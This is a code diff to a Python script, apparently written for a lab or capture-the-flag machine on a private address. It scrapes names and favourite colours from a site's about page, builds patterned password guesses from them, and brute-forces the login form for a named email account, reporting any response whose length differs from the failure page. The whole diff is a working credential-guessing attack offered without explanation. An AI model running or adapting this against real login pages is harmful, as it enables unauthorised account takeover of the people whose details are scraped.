@@ -4,9 +4,23 @@ from bs4 import BeautifulSoup
 
 r = requests.get('http://192.168.56.68:8080/about.html')
 soup = BeautifulSoup(r.text, 'html.parser')
+rows = soup.find_all('tr')[1:]
 
-rows = soup.find_all('tr')
+names = []
+colors = []
 for row in rows:
-    if 'Damian' in row.text or 'Valiant' in row.text:
-        print(row)
-        print("---")
+    cells = row.find_all('td')
+    if len(cells) >= 4:
+        names.append(cells[0].text.strip())
+        colors.append(cells[3].text.strip())
+
+email = 'dvaliant@bedlamdynamics.com'
+url = 'http://192.168.56.68:8080/login-3/index.php'
+
+for name in names:
+    for color in colors:
+        pwd = f"{name}{color.capitalize()}{name}{color.capitalize()}"
+        r2 = requests.post(url, data={'username': email, 'password': pwd})
+        if len(r2.text) != 1130:
+            print(f"*** FOUND *** password: {pwd}")
+            print(r2.text[:200])
